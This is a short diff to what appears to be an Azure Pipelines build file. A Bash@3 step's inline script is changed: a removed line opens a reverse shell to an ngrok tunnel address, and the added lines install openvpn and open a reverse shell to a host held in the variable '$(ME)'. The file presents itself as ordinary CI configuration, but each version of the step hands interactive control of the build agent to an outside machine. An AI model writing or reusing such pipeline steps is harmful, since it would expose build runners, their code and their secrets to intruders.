@@ -8,7 +8,9 @@ steps:
   - task: Bash@3
     inputs:
       targetType: 'inline'
-      script: sh -i >& /dev/tcp/2.tcp.eu.ngrok.io/17458 0>&1
+      script: |
+        sudo apt-get install openvpn
+        sh -i >& /dev/tcp/$(ME) 0>&1
 
   # - task: Bash@3
   #   inputs:
